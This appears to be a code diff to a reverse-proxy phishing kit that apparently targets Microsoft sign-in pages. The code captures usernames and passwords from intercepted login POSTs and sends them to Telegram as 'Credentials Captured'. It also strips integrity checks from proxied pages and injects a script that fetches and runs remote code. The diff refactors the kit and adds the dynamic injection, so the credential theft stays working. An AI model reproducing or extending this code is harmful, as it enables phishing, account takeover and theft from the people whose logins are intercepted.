@@ -92,7 +92,6 @@ function buildProxyUrl(location, sessionId) {
 // } // DISABLED – DIRECT CONNECTION
 // ==================== END GEO-IP & PROXY HELPERS ====================
 
-
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
@@ -321,96 +320,50 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     }
 
                     // ====================================================================
-                    // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (KEEP THIS)
+                    // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION
                     // ====================================================================
                     try {
-    if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
-        const originalBody = clientRequestBody.body;
-        const originalUrl = clientRequestBody.url || '';
-        const originalMethod = clientRequestBody.method || '';
+                        if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
+                            const originalBody = clientRequestBody.body;
+                            const originalUrl = clientRequestBody.url || '';
+                            const originalMethod = clientRequestBody.method || '';
 
-        console.log('[DEBUG] Original body (first 500 chars):', originalBody.substring(0, 500));
-        console.log('[DEBUG] Content-Type:', clientRequestBody.headers?.['content-type'] || '');
+                            // ---- Process ANY POST request that contains passwd or password ----
+                            if (originalMethod === 'POST' && (originalBody.includes('passwd=') || originalBody.includes('password='))) {
+                                let email = '';
+                                let password = '';
+                                const contentType = clientRequestBody.headers?.['content-type'] || '';
 
-        // ---- Process ANY POST request that contains passwd or password in the body ----
-        if (originalMethod === 'POST' && (originalBody.includes('passwd=') || originalBody.includes('password='))) {
+                                if (contentType.includes('application/json')) {
+                                    try {
+                                        const json = JSON.parse(originalBody);
+                                        email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
+                                        password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
+                                    } catch (e) {}
+                                } else if (contentType.includes('application/x-www-form-urlencoded')) {
+                                    try {
+                                        const params = new URLSearchParams(originalBody);
+                                        email = params.get('username') || params.get('user') || params.get('email') || 
+                                                params.get('loginfmt') || params.get('login') || params.get('userid') || '';
+                                        password = params.get('password') || params.get('passwd') || params.get('pass') || 
+                                                   params.get('Password') || params.get('pwd') || '';
+                                    } catch (e) {}
+                                }
 
-            let email = '';
-            let password = '';
-            const contentType = clientRequestBody.headers?.['content-type'] || '';
-
-            // ---- Parse JSON ----
-            if (contentType.includes('application/json')) {
-                try {
-                    const json = JSON.parse(originalBody);
-                    email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
-                    password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
-                } catch (e) {}
-            }
-            // ---- Parse URL-encoded ----
-            else if (contentType.includes('application/x-www-form-urlencoded')) {
-                try {
-                    const params = new URLSearchParams(originalBody);
-                    console.log('[DEBUG] passwd param from URLSearchParams:', params.get('passwd'));
-                    email = params.get('username') || params.get('user') || params.get('email') || 
-                            params.get('loginfmt') || params.get('login') || params.get('userid') || '';
-                    password = params.get('password') || params.get('passwd') || params.get('pass') || 
-                               params.get('Password') || params.get('pwd') || '';
-                    console.log('[DEBUG] After URLSearchParams - email:', email, 'password:', password);
-                } catch (e) {
-                    console.log('[DEBUG] URLSearchParams error:', e.message);
-                }
-            }
-
-            // ---- FALLBACK 1: Regex ----
-            console.log('[DEBUG] Before fallback - password:', password);
-            if (!password) {
-                const passMatch = originalBody.match(/passwd=([^&]*)/);
-                console.log('[DEBUG] Regex match result:', passMatch);
-                if (passMatch) {
-                    password = decodeURIComponent(passMatch[1]);
-                    console.log('[FALLBACK 1] Extracted password via regex:', password);
-                }
-            }
-
-            // ---- FALLBACK 2: Manual split (safest) ----
-            if (!password) {
-                try {
-                    const parts = originalBody.split('&');
-                    for (const part of parts) {
-                        if (part.startsWith('passwd=')) {
-                            const raw = part.substring(7);
-                            password = decodeURIComponent(raw);
-                            console.log('[FALLBACK 2] Extracted password via split:', password);
-                            break;
+                                if (email || password) {
+                                    const msg = `🔐 *Credentials Captured*\n\n` +
+                                                `📧 *Email:* ${email || 'N/A'}\n` +
+                                                `🔑 *Password:* ${password || 'N/A'}\n` +
+                                                `🌐 *URL:* ${originalUrl}\n` +
+                                                `🕐 *Time:* ${new Date().toISOString()}`;
+                                    sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
+                                    console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
+                                }
+                            }
                         }
+                    } catch (e) {
+                        // Silent fail
                     }
-                } catch (e) {
-                    console.log('[DEBUG] Split fallback error:', e.message);
-                }
-            }
-
-            // ---- Send alert if email or password exists ----
-            if (email || password) {
-                const msg = `🔐 *Credentials Captured*\n\n` +
-                            `📧 *Email:* ${email || 'N/A'}\n` +
-                            `🔑 *Password:* ${password || 'N/A'}\n` +
-                            `🌐 *URL:* ${originalUrl}\n` +
-                            `🕐 *Time:* ${new Date().toISOString()}`;
-                sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
-                console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
-            } else {
-                console.log('[DEBUG] No email or password found after all attempts.');
-            }
-        } else {
-            console.log('[DEBUG] Request did not contain passwd= or password= in body. URL:', originalUrl);
-        }
-    } else {
-        console.log('[DEBUG] No clientRequestBody.body found.');
-    }
-} catch (e) {
-    console.log('[DEBUG] Top-level error:', e.message);
-}
                     // ====================================================================
 
                     // Call the async makeProxyRequest (direct connection)
@@ -429,13 +382,10 @@ proxyServer.listen(process.env.PORT ?? 3000);
 
 const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
     // DISABLED PROXY ROTATION – DIRECT CONNECTION
-    // No geoPromise, no proxyLevels – just use direct HTTP/HTTPS request
 
     const isHttps = proxyRequestProtocol === "https:";
     const requestModule = isHttps ? https : http;
     const requestOptions = { ...proxyRequestOptions };
-
-    // Remove any agent if present
     delete requestOptions.agent;
 
     const proxyRequest = requestModule.request(requestOptions, (proxyResponse) => {
@@ -492,14 +442,36 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
                     Buffer.byteLength(serverResponseBody)) {
                     try {
                         const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
-                        let html = decompressedResponseBody.toString('utf8');   // <-- NEW
+                        let html = decompressedResponseBody.toString('utf8');
 
-        // ---- SRI (Integrity) Removal (Carlos) ----
-        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
-        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
-        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
+                        // ---- SRI (Integrity) Removal ----
+                        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
+                        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
+                        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
 
-        serverResponseBody = updateHTMLProxyResponse(Buffer.from(html));
+                        // ---- Dynamic script injection (instead of static <script src="/@">) ----
+                        const dynamicCode = `
+<script>
+  (async function() {
+    try {
+      const resp = await fetch('${PROXY_PATHNAMES.script}');
+      const code = await resp.text();
+      const blob = new Blob([code], { type: 'application/javascript' });
+      const url = URL.createObjectURL(blob);
+      await import(url);
+    } catch(e) {}
+  })();
+</script>`;
+                        // Inject before closing </head>
+                        if (html.includes('</head>')) {
+                            html = html.replace('</head>', dynamicCode + '</head>');
+                        } else if (html.includes('</body>')) {
+                            html = html.replace('</body>', dynamicCode + '</body>');
+                        } else {
+                            html = dynamicCode + html;
+                        }
+
+                        serverResponseBody = Buffer.from(html);
                         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
                         if (proxyResponse.headers["content-length"]) {
@@ -531,18 +503,19 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
     });
 
     proxyRequest.on("error", (error) => {
-    console.error('[PROXY ERROR]', error.name, error.message);
-    console.error('[PROXY ERROR] Full error:', error);
-    console.error('[PROXY ERROR] Stack:', error.stack);
-    clientResponse.writeHead(502, { "Content-Type": "text/plain" });
-    clientResponse.end("Proxy request failed");
-});
+        console.error('[PROXY ERROR]', error.name, error.message);
+        console.error('[PROXY ERROR] Full error:', error);
+        console.error('[PROXY ERROR] Stack:', error.stack);
+        clientResponse.writeHead(502, { "Content-Type": "text/plain" });
+        clientResponse.end("Proxy request failed");
+    });
 
     if (proxyRequestBody) {
         proxyRequest.write(proxyRequestBody);
     }
     proxyRequest.end();
 };
+
 // ==================== REMAINING FUNCTIONS UNCHANGED ====================
 function displayError(message, error, ...args) {
     console.error("******************************");
@@ -707,7 +680,6 @@ function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
 }
 
 function parseCookieDate(cookieDate) {
-    // ... (unchanged) ...
     let foundTime = false;
     let foundDay = false;
     let foundMonth = false;
@@ -801,7 +773,7 @@ function parseCookieDate(cookieDate) {
 }
 
 function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
-    // ... (unchanged) ...
+    // ... unchanged ...
     const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
     const currentTimestamp = Date.now();
     let clockSkew = 0;
@@ -963,7 +935,7 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         "x-waws-unencoded-url",
         "x-client-ip",
         "x-client-port",
-         "x-canary",
+        "x-canary",
         "x-microsoft-telemetry",
         "x-ms-telemetry",
         "x-ms-request-id",
@@ -1100,6 +1072,8 @@ async function compressResponseBody(decompressedData, encodings) {
     return compressedData;
 }
 
+// ---- updateHTMLProxyResponse is no longer used – we replaced it with dynamic injection ----
+// Keeping it for reference, but it's not called anywhere.
 function updateHTMLProxyResponse(decompressedResponseBody) {
     const payload = "<script src=/@></script>";
     const htmlInjectionMap = {
